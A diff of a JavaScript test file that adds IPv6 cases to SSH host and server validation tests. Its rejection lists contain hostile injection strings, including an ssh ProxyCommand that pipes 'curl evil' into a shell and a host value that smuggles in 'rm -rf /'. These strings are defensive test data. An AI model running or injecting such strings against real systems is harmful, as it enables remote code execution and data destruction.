@@ -64,8 +64,16 @@ test("validation: ssh host rejects option injection (-oProxyCommand=...)", async
   for (const ok of ["localhost", "127.0.0.1", "example.com", "my-host.sub.net"]) {
     assert.equal(validateHost(ok), ok);
   }
+  // IPv6 literals (bare / bracketed / zone-scoped) are valid ssh hosts
+  for (const v6 of ["2001:db8::1", "[2001:db8::1]", "::1", "[::1]", "fe80::1%eth0"]) {
+    assert.equal(validateHost(v6), v6, `validateHost accepts ${v6}`);
+  }
   for (const bad of ["-oProxyCommand=sh -c 'curl evil|sh'", "-N", "-p 2222", "-W", "-o", "host;rm -rf /", "host\nx", "-evil"]) {
     assert.throws(() => validateHost(bad), /option injection|invalid host/);
+  }
+  // garbage IPv6-like strings are still rejected
+  for (const bad of ["2001:db8::zzzz", ":::", "[::1", "::1]", "host::extra::port"]) {
+    assert.throws(() => validateHost(bad), /invalid host/);
   }
   assert.throws(() => validateUser("-oProxyCommand=x"), /option injection/);
   assert.throws(() => validateUser("user@host"), /invalid user/); // @ would corrupt user@host
@@ -91,7 +99,7 @@ test("validation: port range + server host[:port]", async () => {
   for (const bad of [0, -1, 65536, 1.5, NaN, "abc", null]) {
     assert.throws(() => validatePort(bad), /invalid .*port/);
   }
-  for (const ok of ["localhost", "127.0.0.1:7000", "frp.example.com:7001", "[::1]:7000", "1.2.3.4"]) {
+  for (const ok of ["localhost", "127.0.0.1:7000", "frp.example.com:7001", "[::1]:7000", "1.2.3.4", "2001:db8::1", "[2001:db8::1]:7000"]) {
     assert.equal(validateServer(ok), ok);
   }
   for (const bad of ["-evil.com:7000", "host:0", "host:99999", "a:b:c", "host:port", "host\nx", ""]) {
